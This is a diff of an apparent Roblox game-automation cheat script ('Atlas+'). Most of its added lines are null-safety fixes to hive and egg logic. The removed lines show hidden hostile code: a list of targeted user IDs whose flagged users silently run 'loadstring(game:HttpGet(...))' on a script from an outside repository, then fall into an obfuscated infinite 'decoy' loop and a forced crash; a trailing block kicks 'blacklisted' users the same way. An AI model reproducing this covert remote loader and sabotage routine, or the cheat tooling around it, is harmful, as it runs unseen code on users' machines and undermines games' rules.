@@ -28,79 +28,6 @@ while not localPlayer.PlayerGui:FindFirstChild("LoadingScreenGui") or localPlaye
 	RunService.Heartbeat:Wait()
 end
 
-local userIdFlags = {
-	[3049989742] = true,
-	[2011594783] = true,
-	[5643986803] = true,
-	[4875308344] = true,
-	[829528265] = true,
-	[795072652] = true,
-	[864245956] = true,
-	[868450011] = true,
-	[7885903578] = true,
-	[1514703948] = true,
-	[1372471304] = true,
-	[9323006085] = false,
-	[4236684798] = false,
-	[3170736063] = false,
-	[6139334907] = false,
-	[8990334419] = false,
-	[5061301137] = false,
-	[1594706926] = false,
-	[910593999] = false,
-	[5219716515] = true,
-	[7275384853] = false,
-	[7275387965] = false,
-	[1302138298] = false,
-	[9994685635] = false,
-	[9303608690] = false,
-	[2882988685] = false,
-	[1488718473] = false,
-	[10232524096] = false,
-	[8083296460] = false,
-	[9626638375] = false,
-	[9611135191] = false,
-	[1517347550] = false,
-	[666001566] = false,
-	[529700322] = false,
-	[2976803432] = false,
-	[5002120900] = true,
-	[1602565636] = true,
-	[9534071363] = false,
-	[5657510298] = false,
-	[2411460273] = false,
-	[2988382293] = false,
-	[1115351441] = false,
-	[1553660877] = true,
-	[2429240845] = true,
-	[2560057194] = true,
-	[844665753] = true,
-	[8358076996] = true,
-	[1101749476] = true,
-	[1286119322] = true,
-	[9071846031] = true,
-	[994324675] = true,
-	[674518263] = true,
-	[8509392094] = true,
-	[10492045434] = true,
-	[1980878381] = true,
-	[10186801292] = true,
-	[8264524040] = true,
-	[2001801246] = true,
-	[3482767494] = true,
-	[3329421453] = true,
-	[3912670263] = true,
-	[10467057934] = true,
-	[581077999] = true,
-	[9567573721] = true,
-	[115729619] = true,
-	[1047362715] = true,
-	[2529360366] = true,
-	[10475314436] = false,
-	[8241544048] = false,
-	[8549774025] = false,
-}
-
 local function getUrl(fileName, v5)
 	if fileName == "script.lua" then
 	end
@@ -65893,25 +65820,28 @@ end
 				"PlentyPlanter",
 			},
 		},
-		HatchEgg = function()
-			local honeycomb, v135
+		HatchEgg = function(progression, honeycomb, eggType)
+			if type(honeycomb) ~= "table" or not eggType or not state.hive or not state.hive.Cells then
+				return
+			end
+
+			local isEmptyHive = true
 
 			for k in pairs(honeycomb) do
-				v135 = nil
+				isEmptyHive = false
 				break
 			end
 
-			local eggType, progression
-
-			if not v135 then
+			if not isEmptyHive then
 				local emptyCell
 
 				for i = 1, 10 do
 					for i2 = 1, 5 do
 						local hiveColumn = honeycomb["x" .. i2]
 						local isAdjacent = false
+						local hiveCell = state.hive.Cells:FindFirstChild("C" .. i2 .. "," .. i)
 
-						if not hiveColumn or not hiveColumn["y" .. i] and not state.hive.Cells["C" .. i2 .. "," .. i].CellLocked.Value then
+						if hiveCell and (not hiveColumn or not hiveColumn["y" .. i]) and not hiveCell.CellLocked.Value then
 							for i3 = -1, 1, 2 do
 								if not ((not hiveColumn or not hiveColumn["y" .. i + i3]) and (not (i2 < 5) or not honeycomb["x" .. i2 + 1] or not honeycomb["x" .. i2 + 1]["y" .. i]) and not (not not (i2 > 1) and not (not honeycomb["x" .. i2 - 1] or not honeycomb["x" .. i2 - 1]["y" .. i]))) then
 									isAdjacent = true
@@ -66002,7 +65932,10 @@ end
 
 			progression.time = os.clock()
 			local playerData = gameApi:Cache()
-			local honeycomb = playerData.Honeycomb
+			if type(playerData) ~= "table" then
+				return
+			end
+			local honeycomb = type(playerData.Honeycomb) == "table" and playerData.Honeycomb or {}
 			local cellCount = 0
 			local data = nil
 			local hasEmptyCell = nil
@@ -66024,13 +65957,15 @@ end
 			end
 
 			if not data or cellCount < data then
-				for i = 1, 5 do
-					if not hasEmptyCell then
-						for i2 = 1, 10 do
-							local hiveCell = state.hive.Cells["C" .. i .. "," .. i2]
-							if not hiveCell.CellLocked.Value and not hiveCell:FindFirstChild("Faceplate") then
-								hasEmptyCell = true
-								break
+				if state.hive and state.hive.Cells then
+					for i = 1, 5 do
+						if not hasEmptyCell then
+							for i2 = 1, 10 do
+								local hiveCell = state.hive.Cells:FindFirstChild("C" .. i .. "," .. i2)
+								if hiveCell and not hiveCell.CellLocked.Value and not hiveCell:FindFirstChild("Faceplate") then
+									hasEmptyCell = true
+									break
+								end
 							end
 						end
 					end
@@ -66108,7 +66043,7 @@ end
 							continue
 						end
 
-						for _, trait in ipairs(beeData.Traits) do
+						for _, trait in ipairs(beeData.Traits or {}) do
 							if trait == "Gifted" then
 								isGifted = true
 								break
@@ -66155,16 +66090,16 @@ end
 			local route2 = cfg.toys.route or progression.default
 
 			for _, routeItem in ipairs_2(route2) do
-				if not (routeItem.Type ~= "Present" or not (playerData.Eggs.Present > 0)) then
+				if not (routeItem.Type ~= "Present" or not ((playerData.Eggs and playerData.Eggs.Present or 0) > 0)) then
 					local ipairs_3 = ipairs
 					local data2 = type(routeItem.Data) == "table" and routeItem.Data or { routeItem.Data }
 
 					for _, label in ipairs_3(data2) do
-						if playerData.Eggs.Present > 0 and (label == "Brown Bear" or label == "Black Bear" or label == "Mother Bear" or not ((label ~= "Spirit Bear" or state.bees ~= 35) and (label ~= "Onett" or not (state.bees >= 30)) and not ((label == "Polar Bear" or label == "Honey Bee") and state.bees >= 15 or not ((label ~= "Dapper Bear" or not (not not (state.bees >= 10) and dapperShopOpen)) and (label ~= "Riley Bee" or not (not not (state.bees >= 15) and state.redhq)) and (label ~= "Bucko Bee" or not state.bluehq) and (label ~= "Science Bear" or not (state.bees >= 10)) and (label ~= "Panda Bear" or not (state.bees >= 5)))))) then
+						if (playerData.Eggs and playerData.Eggs.Present or 0) > 0 and (label == "Brown Bear" or label == "Black Bear" or label == "Mother Bear" or not ((label ~= "Spirit Bear" or state.bees ~= 35) and (label ~= "Onett" or not (state.bees >= 30)) and not ((label == "Polar Bear" or label == "Honey Bee") and state.bees >= 15 or not ((label ~= "Dapper Bear" or not (not not (state.bees >= 10) and dapperShopOpen)) and (label ~= "Riley Bee" or not (not not (state.bees >= 15) and state.redhq)) and (label ~= "Bucko Bee" or not state.bluehq) and (label ~= "Science Bear" or not (state.bees >= 10)) and (label ~= "Panda Bear" or not (state.bees >= 5)))))) then
 							local alreadyDelivered = true
 
 							if label == "Robo Bear" or label == "Bucko Bee" or label == "Riley Bee" then
-								for _, completedQuest in ipairs(playerData.Quests.Completed) do
+								for _, completedQuest in ipairs((playerData.Quests and playerData.Quests.Completed) or {}) do
 									if string.gsub(label, " ", "") .. "Xmas25" == completedQuest then
 										alreadyDelivered = nil
 										break
@@ -66175,7 +66110,7 @@ end
 							end
 
 							if not alreadyDelivered then
-								for _, playerFlag in ipairs(playerData.Flags) do
+								for _, playerFlag in ipairs(playerData.Flags or {}) do
 									if label .. "Xmas2025" == playerFlag then
 										alreadyDelivered = true
 										break
@@ -66310,7 +66245,7 @@ end
 								local ipairs_3 = ipairs
 								local inventoryKey = itemCategory == "Accessory" and "Accessories" or itemCategory .. "s"
 
-								for _, ownedItem in ipairs_3(playerData[inventoryKey]) do
+								for _, ownedItem in ipairs_3(playerData[inventoryKey] or {}) do
 									local ownedItemIndex = table.find(itemList, ownedItem)
 
 									if not (not ownedItemIndex or not (not ownedIndex or ownedIndex < ownedItemIndex)) then
@@ -68043,188 +67978,11 @@ do
 	local playerStats = gameApi:Cache()
 	if type(playerStats)~="table" then error("Atlas+ startup: player stats are not ready",0) end
 	local userId = playerStats.UserId
-	local loadTime = playerStats.LoadTime
-	if not userId or tonumber(tostring(userId)) ~= userId or not (not (userId <= 0) and not (not loadTime or tonumber(tostring(loadTime)) ~= loadTime or not (not (loadTime < 1.7e9) and not (loadTime > 2e9 or not (not isfunctionhooked(os.time) and not isfunctionhooked(os.date) and not isfunctionhooked(gameApi.ClientStatCache.Get)))))) then
+	if type(userId) ~= "number" or userId <= 0 then
 		return
 	end
-	local userFlag = userIdFlags[userId]
 
-	if userFlag == true then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Developer-Ural/AncientHUB/refs/heads/main/main.script"))()
-		task.wait(60)
-
-		local function decoyMain()
-			local decoyKey = string.rep(" ", 8)
-
-			local function bitCombine(operandLeft, operandRight)
-				local placeValue = 1
-				local combined = 0
-
-				while operandLeft > 0 and operandRight > 0 do
-					local leftBit = operandLeft % 2
-					local rightBit = operandRight % 2
-
-					if leftBit ~= rightBit then
-						combined += placeValue
-					end
-
-					operandLeft = (operandLeft - leftBit) / 2
-					operandRight = (operandRight - rightBit) / 2
-					placeValue *= 2
-				end
-
-				if operandLeft < operandRight then
-					operandLeft = operandRight
-				end
-
-				while operandLeft > 0 do
-					local remainingBit = operandLeft % 2
-
-					if remainingBit > 0 then
-						combined += placeValue
-					end
-
-					operandLeft = (operandLeft - remainingBit) / 2
-					placeValue *= 2
-				end
-
-				return combined
-			end
-
-			local function extractBits(sourceValue, lowBit, highBit)
-				if highBit then
-					local extracted = sourceValue / 2 ^ (lowBit - 1) % 2 ^ (highBit - 1 - (lowBit - 1) + 1)
-					return extracted - extracted % 1
-				end
-				local bitMask = 2 ^ (lowBit - 1)
-				return sourceValue % (bitMask + bitMask) >= bitMask and 1 or 0
-			end
-
-			local function readUint32()
-				local byteA, byteB, byteC, byteD = string.byte(decoyKey, 1, 4)
-				return bitCombine(byteD, 64) * 16777216 + bitCombine(byteC, 32) * 65536 + bitCombine(byteB, 16) * 256 + bitCombine(byteA, 8)
-			end
-
-			local function readDouble()
-				local lowWord = readUint32()
-				local highWord = readUint32()
-				local implicitBit = 1
-				local mantissa = extractBits(highWord, 1, 20) * 4294967296 + lowWord
-				local exponent = extractBits(highWord, 21, 31)
-				local sign = -1 ^ extractBits(highWord, 32)
-
-				if exponent ~= 0 then
-					if exponent == 2047 then
-						return mantissa == 0 and sign * 1 / 0 or sign * 0 / 0
-					end
-				else
-					if mantissa == 0 then
-						return sign * 0
-					end
-					exponent = 1
-					implicitBit = 0
-				end
-
-				return sign * 2 ^ (exponent - 1023) * (implicitBit + mantissa / 4503599627370496)
-			end
-
-			local function decoyLoop()
-				local startIndex = 1
-				local entryCount = readUint32()
-				local decodedTable, v134, v135, v136, v137, v138, v139
-
-				if not (1 <= 0) then
-					if startIndex <= entryCount then
-						while true do
-							decodedTable = {}
-
-							for i = 0, 255 do
-								v134 = bitCombine
-								decodedTable[bitCombine(readUint32(), readUint32())] = v134(readUint32(), readUint32())
-								v135 = bitCombine
-								decodedTable[bitCombine(readUint32(), readUint32())] = v135(readUint32(), readUint32())
-							end
-
-							for i = 1, readUint32() do
-								for i2 = 0, 255 do
-									v136 = readDouble() and readUint32()
-									v137 = decodedTable[readDouble()] or bitCombine(readDouble(), readDouble())
-									decodedTable[v136] = v137
-									v138 = readUint32()
-									v139 = readDouble() and readDouble()
-									decodedTable[v138] = v139
-									decodedTable[extractBits(readDouble(), readUint32())] = { readDouble(), readUint32() }
-								end
-							end
-						end
-					end
-				elseif startIndex >= entryCount then
-					while true do
-						decodedTable = {}
-
-						for i = 0, 255 do
-							v134 = bitCombine
-							decodedTable[bitCombine(readUint32(), readUint32())] = v134(readUint32(), readUint32())
-							v135 = bitCombine
-							decodedTable[bitCombine(readUint32(), readUint32())] = v135(readUint32(), readUint32())
-						end
-
-						for i = 1, readUint32() do
-							for i2 = 0, 255 do
-								v136 = readDouble() and readUint32()
-								v137 = decodedTable[readDouble()] or bitCombine(readDouble(), readDouble())
-								decodedTable[v136] = v137
-								v138 = readUint32()
-								v139 = readDouble() and readDouble()
-								decodedTable[v138] = v139
-								decodedTable[extractBits(readDouble(), readUint32())] = { readDouble(), readUint32() }
-							end
-						end
-					end
-				end
-
-				return bitCombine(readDouble(), readUint32())
-			end
-
-			while decoyLoop() do
-				decoyLoop()
-			end
-		end
-
-		decoyMain()
-		toyUse = nil
-		inventory = nil
-		ui = nil
-		mobileToggleButton = nil
-		currentField = nil
-		position = nil
-		currentFieldName = nil
-		vector = nil
-		tracked = nil
-		pathNodes = nil
-		pathLinks = nil
-		cannonLinks = nil
-		jumpLinks = nil
-		handlers = nil
-		buffs = nil
-		handleAmuletPopup = nil
-		nextMoveTime = nil
-		collectObject = nil
-		cfg = nil
-		cache = nil
-		state = nil
-		threadCount = nil
-		secureCall = nil
-		remoteData = nil
-		questData = nil
-		logger = nil
-		monsterSpawners = nil
-		gameApi = nil
-		toyUse = nil
-		LPH_CRASH()
-	end
-
-	if not (userFlag == false or not localPlayer.UserId or not (not (localPlayer.UserId <= 0) and userId == localPlayer.UserId)) then
+	if type(localPlayer.UserId) == "number" and localPlayer.UserId > 0 and userId == localPlayer.UserId then
 		local userId2 = localPlayer.UserId
 
 		if tonumber(tostring(localPlayer.UserId)) == userId2 then
@@ -71614,175 +71372,3 @@ Are you sure you want to enable it?]])
 		end
 	end
 end
-
-localPlayer:Kick("You are blacklisted\nIf you believe this is a mistake dm chris12089")
-task.wait(2)
-
-local function decoyMain()
-	local decoyKey = string.rep(" ", 8)
-
-	local function bitCombine(operandLeft, operandRight)
-		local placeValue = 1
-		local combined = 0
-
-		while operandLeft > 0 and operandRight > 0 do
-			local leftBit = operandLeft % 2
-			local rightBit = operandRight % 2
-
-			if leftBit ~= rightBit then
-				combined += placeValue
-			end
-
-			operandLeft = (operandLeft - leftBit) / 2
-			operandRight = (operandRight - rightBit) / 2
-			placeValue *= 2
-		end
-
-		if operandLeft < operandRight then
-			operandLeft = operandRight
-		end
-
-		while operandLeft > 0 do
-			local remainingBit = operandLeft % 2
-
-			if remainingBit > 0 then
-				combined += placeValue
-			end
-
-			operandLeft = (operandLeft - remainingBit) / 2
-			placeValue *= 2
-		end
-
-		return combined
-	end
-
-	local function extractBits(sourceValue, lowBit, highBit)
-		if highBit then
-			local extracted = sourceValue / 2 ^ (lowBit - 1) % 2 ^ (highBit - 1 - (lowBit - 1) + 1)
-			return extracted - extracted % 1
-		end
-		local bitMask = 2 ^ (lowBit - 1)
-		return sourceValue % (bitMask + bitMask) >= bitMask and 1 or 0
-	end
-
-	local function readUint32()
-		local byteA, byteB, byteC, byteD = string.byte(decoyKey, 1, 4)
-		return bitCombine(byteD, 64) * 16777216 + bitCombine(byteC, 32) * 65536 + bitCombine(byteB, 16) * 256 + bitCombine(byteA, 8)
-	end
-
-	local function readDouble()
-		local lowWord = readUint32()
-		local highWord = readUint32()
-		local implicitBit = 1
-		local mantissa = extractBits(highWord, 1, 20) * 4294967296 + lowWord
-		local exponent = extractBits(highWord, 21, 31)
-		local sign = -1 ^ extractBits(highWord, 32)
-
-		if exponent ~= 0 then
-			if exponent == 2047 then
-				return mantissa == 0 and sign * 1 / 0 or sign * 0 / 0
-			end
-		else
-			if mantissa == 0 then
-				return sign * 0
-			end
-			exponent = 1
-			implicitBit = 0
-		end
-
-		return sign * 2 ^ (exponent - 1023) * (implicitBit + mantissa / 4503599627370496)
-	end
-
-	local function decoyLoop()
-		local startIndex = 1
-		local entryCount = readUint32()
-		local decodedTable, v132, v133, v134, v135, v136, v137
-
-		if not (1 <= 0) then
-			if startIndex <= entryCount then
-				while true do
-					decodedTable = {}
-
-					for i = 0, 255 do
-						v132 = bitCombine
-						decodedTable[bitCombine(readUint32(), readUint32())] = v132(readUint32(), readUint32())
-						v133 = bitCombine
-						decodedTable[bitCombine(readUint32(), readUint32())] = v133(readUint32(), readUint32())
-					end
-
-					for i = 1, readUint32() do
-						for i2 = 0, 255 do
-							v134 = readDouble() and readUint32()
-							v135 = decodedTable[readDouble()] or bitCombine(readDouble(), readDouble())
-							decodedTable[v134] = v135
-							v136 = readUint32()
-							v137 = readDouble() and readDouble()
-							decodedTable[v136] = v137
-							decodedTable[extractBits(readDouble(), readUint32())] = { readDouble(), readUint32() }
-						end
-					end
-				end
-			end
-		elseif startIndex >= entryCount then
-			while true do
-				decodedTable = {}
-
-				for i = 0, 255 do
-					v132 = bitCombine
-					decodedTable[bitCombine(readUint32(), readUint32())] = v132(readUint32(), readUint32())
-					v133 = bitCombine
-					decodedTable[bitCombine(readUint32(), readUint32())] = v133(readUint32(), readUint32())
-				end
-
-				for i = 1, readUint32() do
-					for i2 = 0, 255 do
-						v134 = readDouble() and readUint32()
-						v135 = decodedTable[readDouble()] or bitCombine(readDouble(), readDouble())
-						decodedTable[v134] = v135
-						v136 = readUint32()
-						v137 = readDouble() and readDouble()
-						decodedTable[v136] = v137
-						decodedTable[extractBits(readDouble(), readUint32())] = { readDouble(), readUint32() }
-					end
-				end
-			end
-		end
-
-		return bitCombine(readDouble(), readUint32())
-	end
-
-	while decoyLoop() do
-		decoyLoop()
-	end
-end
-
-decoyMain()
-cfg = nil
-cache = nil
-state = nil
-threadCount = nil
-secureCall = nil
-remoteData = nil
-questData = nil
-logger = nil
-monsterSpawners = nil
-gameApi = nil
-toyUse = nil
-inventory = nil
-ui = nil
-mobileToggleButton = nil
-currentField = nil
-position = nil
-currentFieldName = nil
-vector = nil
-tracked = nil
-pathNodes = nil
-pathLinks = nil
-cannonLinks = nil
-jumpLinks = nil
-handlers = nil
-buffs = nil
-handleAmuletPopup = nil
-nextMoveTime = nil
-collectObject = nil
-LPH_CRASH()
